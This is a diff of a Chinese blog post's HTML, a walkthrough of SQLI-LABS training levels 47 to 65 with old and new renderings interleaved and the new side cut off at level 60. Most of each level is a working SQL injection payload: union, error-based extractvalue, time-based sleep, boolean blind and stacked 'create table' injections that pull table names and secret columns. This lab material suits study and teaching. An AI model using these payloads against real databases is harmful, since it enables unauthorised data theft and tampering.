-<h1 id="LESS-55"><a href="#LESS-55" class="headerlink" title="LESS-55"></a>LESS-55</h1><p>本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1)%23</span><br></pre></td></tr></table></figure></p>
-<p>爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure></p>
+
+        <h1 id="LESS-47">
+          <a href="#LESS-47" class="heading-link"><i class="fas fa-link"></i></a>LESS-47</h1>
+      <p>本关只是闭合方式发生了变化，只能进行报错和延时注入</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1&#39; and extractvalue(1,concat(0x3c,(select database())))%23</span><br><span class="line">?sort&#x3D;1 and if(1&#x3D;1, sleep(1), null)</span><br><span class="line">?sort&#x3D;1&#39; and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23</span><br><span class="line">?sort&#x3D;1&#39; and (ascii(substr((select database()) ,1,1))) &#x3D; 115 and if(1&#x3D;1, sleep(1), null)%23</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="LESS-48">
+          <a href="#LESS-48" class="heading-link"><i class="fas fa-link"></i></a>LESS-48</h1>
+      <p>这关没有报错回显，延时盲注即可<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1 and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-49">
+          <a href="#LESS-49" class="heading-link"><i class="fas fa-link"></i></a>LESS-49</h1>
+      <p>跟上关差不多只是闭合方式不同<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1&#39; and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-50">
+          <a href="#LESS-50" class="heading-link"><i class="fas fa-link"></i></a>LESS-50</h1>
+      <p>考察order by的堆叠注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1;create table test like users;</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-51">
+          <a href="#LESS-51" class="heading-link"><i class="fas fa-link"></i></a>LESS-51</h1>
+      <p>闭合方式不同<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1&#39;;create table test like users--+</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-52">
+          <a href="#LESS-52" class="heading-link"><i class="fas fa-link"></i></a>LESS-52</h1>
+      <p>本题不报错，无法报错注入，依然可以堆叠注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1;create table test like users</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-53">
+          <a href="#LESS-53" class="heading-link"><i class="fas fa-link"></i></a>LESS-53</h1>
+      <p>本关错误不能回显，但是可以和51关一样堆叠注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1&#39;;create table test like users--+</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-54">
+          <a href="#LESS-54" class="heading-link"><i class="fas fa-link"></i></a>LESS-54</h1>
+      <p>从本关开始进行更加进阶的注入，所用数据库也改为<code>challenges</code>，每个答案只能尝试10次，10次之后则会重置表名选项等信息。</p>
+<p>由于已经知道数据库名，所以可以直接开始爆表名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure></p>
+<p>得到表名 <code>utj0xhedjp</code>(你的和我的不一样，是随机的)，接下来爆列名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;utj0xhedjp&#39;--+</span><br></pre></td></tr></table></div></figure></p>
+<p>得到<code>id,sessid,secret_W2TD,tryy</code>，得到字段<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,secret_W2TD,3 from utj0xhedjp--+</span><br></pre></td></tr></table></div></figure><br>得到<code>vYPh8AlkQMTlEGkZXRKWo1PT</code>，提交即可。</p>
+
+        <h1 id="LESS-55">
+          <a href="#LESS-55" class="heading-link"><i class="fas fa-link"></i></a>LESS-55</h1>
+      <p>本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1)%23</span><br></pre></td></tr></table></div></figure></p>
+<p>爆表名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></div></figure></p>
 <blockquote>
 <p>jq0p5t7r1m</p>
 </blockquote>
-<p>爆列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;jq0p5t7r1m&apos;%23</span><br></pre></td></tr></table></figure></p>
+<p>爆列名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;jq0p5t7r1m&#39;%23</span><br></pre></td></tr></table></div></figure></p>
 <blockquote>
 <p>id,sessid,secret_3JXI,tryy</p>
 </blockquote>
-<p>继续<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,secret_3JXI,3 from jq0p5t7r1m%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-56"><a href="#LESS-56" class="headerlink" title="LESS-56"></a>LESS-56</h1><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)%23</span><br></pre></td></tr></table></figure></p>
+<p>继续<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1) union select 1,secret_3JXI,3 from jq0p5t7r1m%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-56">
+          <a href="#LESS-56" class="heading-link"><i class="fas fa-link"></i></a>LESS-56</h1>
+      <p>payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)%23</span><br></pre></td></tr></table></div></figure></p>
 <p>剩下的就不做了。</p>
-<p><strong>注意：</strong>本题中，如果用<code>?id=1”%23</code>也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure></p>
-<p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p>
+<p><strong>注意：</strong>本题中，如果用<code>?id=1”%23</code>也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id&#x3D;(&#39;1&quot;#&#39;) LIMIT 0,1</span><br></pre></td></tr></table></div></figure><br>在数据库中执行确实能够查到数据，那么问题在哪呢？</p>
 <blockquote>
 <p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>&#39;1&quot;#&#39;</code>转化为数字值为1，如果是<code>&#39;11fads&#39;</code>则为11，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。 </p>
 </blockquote>
-<h1 id="LESS-57"><a href="#LESS-57" class="headerlink" title="LESS-57"></a>LESS-57</h1><p>本题是双引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-58"><a href="#LESS-58" class="headerlink" title="LESS-58"></a>LESS-58</h1><p>本题无法进行联合注入，但是可以报错，故报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x5c,(select )))%23</span><br></pre></td></tr></table></figure></p>
-<p>爆内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x5c,(select secret_AJHH from y9hrni0ywl)))%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-59"><a href="#LESS-59" class="headerlink" title="LESS-59"></a>LESS-59</h1><p>本题可以直接报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-60"><a href="#LESS-60" class="headerlink" title="LESS-60"></a>LESS-60</h1><p>改变闭合方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) and extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-61"><a href="#LESS-61" class="headerlink" title="LESS-61"></a>LESS-61</h1><p>双引号闭合，有点奇葩<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and extractvalue(1,concat(0x5c,(select database())))--+</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-62"><a href="#LESS-62" class="headerlink" title="LESS-62"></a>LESS-62</h1><p>本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(database())=10 and &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p>
-<p>爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))=54 and &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p>
-<p>爆列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;64r31rkgr6&apos;),2,1))=100 and &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p>
-<p>爆数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select secret_R69X from 64r31rkgr6 ),1,1))=121 and &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p>
-<p>但是查看源代码发现这并非本关的闭合方式，闭合的话应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;) and length(database())=10%23</span><br></pre></td></tr></table></figure></p>
-<p>但是我的payload也是可以的，原因在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。</p>
-<h1 id="LESS-63"><a href="#LESS-63" class="headerlink" title="LESS-63"></a>LESS-63</h1><p>单引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-64"><a href="#LESS-64" class="headerlink" title="LESS-64"></a>LESS-64</h1><p>双括号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1))%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-65"><a href="#LESS-65" class="headerlink" title="LESS-65"></a>LESS-65</h1><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。</p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-  <div>
-    
-      <div>
-    
-        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-    
-  </div>
-
-    
-
-    
-      
-    
-    
-      <div>
-        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-  <div>您今天怎么辣么迷人！</div>
-  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-    <span>Donate</span>
-  </button>
-  <div id="QR" style="display: none;">
-
-    
-      <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/reward-wechat.png" alt="Aesm1p WeChat Pay"/>
-        <p>WeChat Pay</p>
-      </div>
-    
-
-    
-      <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="Aesm1p Alipay"/>
-        <p>Alipay</p>
-      </div>
-    
-
-    
-
-  </div>
-</div>
-
-      </div>
-    
-
-    
-      <div>
-        
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>Post author:  </strong>Aesm1p</li>
-  <li class="post-copyright-link">
-    <strong>Post link: </strong>
-    
-    <a href="http://chaosec.top/2018/03/05/sqli-labs3/" title="SQLI-LABS(Less36-Less65)">http://chaosec.top/2018/03/05/sqli-labs3/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/02/18/mysql7/" rel="next" title="MySQL学习笔记(七)">
-                <i class="fa fa-chevron-left"></i> MySQL学习笔记(七)
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/12/bugkuwriteup/" rel="prev" title="BUGKU-CTF题解">
-                BUGKU-CTF题解 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/images/avatar.jpg"
-                alt="Aesm1p"/>
-            
-              <p class="site-author-name" itemprop="name">Aesm1p</p>
-              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives">
-                
-                    <span class="site-state-item-count">34</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-categories">
-                  <a href="/categories/index-2.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">6</span>
-                    <span class="site-state-item-name">categories</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  <a href="/tags/index.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">16</span>
-                    <span class="site-state-item-name">tags</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                  
-                    
-                  
-                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
-                </span>
-              
-            </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
-             </div>
-          
-
-          
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-36"><span class="nav-number">1.</span> <span class="nav-text"><a href="#LESS-36" class="headerlink" title="LESS-36"></a>LESS-36</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-37"><span class="nav-number">2.</span> <span class="nav-text"><a href="#LESS-37" class="headerlink" title="LESS-37"></a>LESS-37</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆叠注入stacked-injection"><span class="nav-number">3.</span> <span class="nav-text"><a href="#&#x5806;&#x53E0;&#x6CE8;&#x5165;stacked-injection" class="headerlink" title="&#x5806;&#x53E0;&#x6CE8;&#x5165;stacked injection"></a><code>&#x5806;&#x53E0;&#x6CE8;&#x5165;stacked injection</code></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-38"><span class="nav-number">4.</span> <span class="nav-text"><a href="#LESS-38" class="headerlink" title="LESS-38"></a>LESS-38</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-39"><span class="nav-number">5.</span> <span class="nav-text"><a href="#LESS-39" class="headerlink" title="LESS-39"></a>LESS-39</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-40"><span class="nav-number">6.</span> <span class="nav-text"><a href="#LESS-40" class="headerlink" title="LESS-40"></a>LESS-40</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-41"><span class="nav-number">7.</span> <span class="nav-text"><a href="#LESS-41" class="headerlink" title="LESS-41"></a>LESS-41</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-42"><span class="nav-number">8.</span> <span class="nav-text"><a href="#LESS-42" class="headerlink" title="LESS-42"></a>LESS-42</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-43"><span class="nav-number">9.</span> <span class="nav-text"><a href="#LESS-43" class="headerlink" title="LESS-43"></a>LESS-43</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-44"><span class="nav-number">10.</span> <span class="nav-text"><a href="#LESS-44" class="headerlink" title="LESS-44"></a>LESS-44</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-45"><span class="nav-number">11.</span> <span class="nav-text"><a href="#LESS-45" class="headerlink" title="LESS-45"></a>LESS-45</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-46"><span class="nav-number">12.</span> <span class="nav-text"><a href="#LESS-46" class="headerlink" title="LESS-46"></a>LESS-46</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-47"><span class="nav-number">13.</span> <span class="nav-text"><a href="#LESS-47" class="headerlink" title="LESS-47"></a>LESS-47</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-48"><span class="nav-number">14.</span> <span class="nav-text"><a href="#LESS-48" class="headerlink" title="LESS-48"></a>LESS-48</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-49"><span class="nav-number">15.</span> <span class="nav-text"><a href="#LESS-49" class="headerlink" title="LESS-49"></a>LESS-49</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-50"><span class="nav-number">16.</span> <span class="nav-text"><a href="#LESS-50" class="headerlink" title="LESS-50"></a>LESS-50</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-51"><span class="nav-number">17.</span> <span class="nav-text"><a href="#LESS-51" class="headerlink" title="LESS-51"></a>LESS-51</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-52"><span class="nav-number">18.</span> <span class="nav-text"><a href="#LESS-52" class="headerlink" title="LESS-52"></a>LESS-52</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-53"><span class="nav-number">19.</span> <span class="nav-text"><a href="#LESS-53" class="headerlink" title="LESS-53"></a>LESS-53</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-54"><span class="nav-number">20.</span> <span class="nav-text"><a href="#LESS-54" class="headerlink" title="LESS-54"></a>LESS-54</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-55"><span class="nav-number">21.</span> <span class="nav-text"><a href="#LESS-55" class="headerlink" title="LESS-55"></a>LESS-55</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-56"><span class="nav-number">22.</span> <span class="nav-text"><a href="#LESS-56" class="headerlink" title="LESS-56"></a>LESS-56</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-57"><span class="nav-number">23.</span> <span class="nav-text"><a href="#LESS-57" class="headerlink" title="LESS-57"></a>LESS-57</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-58"><span class="nav-number">24.</span> <span class="nav-text"><a href="#LESS-58" class="headerlink" title="LESS-58"></a>LESS-58</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-59"><span class="nav-number">25.</span> <span class="nav-text"><a href="#LESS-59" class="headerlink" title="LESS-59"></a>LESS-59</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-60"><span class="nav-number">26.</span> <span class="nav-text"><a href="#LESS-60" class="headerlink" title="LESS-60"></a>LESS-60</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-61"><span class="nav-number">27.</span> <span class="nav-text"><a href="#LESS-61" class="headerlink" title="LESS-61"></a>LESS-61</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-62"><span class="nav-number">28.</span> <span class="nav-text"><a href="#LESS-62" class="headerlink" title="LESS-62"></a>LESS-62</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-63"><span class="nav-number">29.</span> <span class="nav-text"><a href="#LESS-63" class="headerlink" title="LESS-63"></a>LESS-63</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-64"><span class="nav-number">30.</span> <span class="nav-text"><a href="#LESS-64" class="headerlink" title="LESS-64"></a>LESS-64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-65"><span class="nav-number">31.</span> <span class="nav-text"><a href="#LESS-65" class="headerlink" title="LESS-65"></a>LESS-65</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">32.</span> <span class="nav-text"><a href="#&#x540E;&#x8BB0;" class="headerlink" title="&#x540E;&#x8BB0;"></a>&#x540E;&#x8BB0;</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Aesm1p</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-      <i class="fa fa-user"></i>
-    </span>
-    <span class="site-uv" title="Total Visitors">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-    <span class="post-meta-divider">|</span>
-  
-
-  
-    <span class="post-meta-item-icon">
-      <i class="fa fa-eye"></i>
-    </span>
-    <span class="site-pv" title="Total Views">
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-    </span>
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+        <h1 id="LESS-57">
+          <a href="#LESS-57" class="heading-link"><i class="fas fa-link"></i></a>LESS-57</h1>
+      <p>本题是双引号闭合<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-58">
+          <a href="#LESS-58" class="heading-link"><i class="fas fa-link"></i></a>LESS-58</h1>
+      <p>本题无法进行联合注入，但是可以报错，故报错注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select )))%23</span><br></pre></td></tr></table></div></figure><br>爆内容<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select secret_AJHH from y9hrni0ywl)))%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-59">
+          <a href="#LESS-59" class="heading-link"><i class="fas fa-link"></i></a>LESS-59</h1>
+      <p>本题可以直接报错注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-60">
+          <a href="#LESS-60" class="heading-link"><i class="fas fa-link"></i></a>LESS-60</h1>
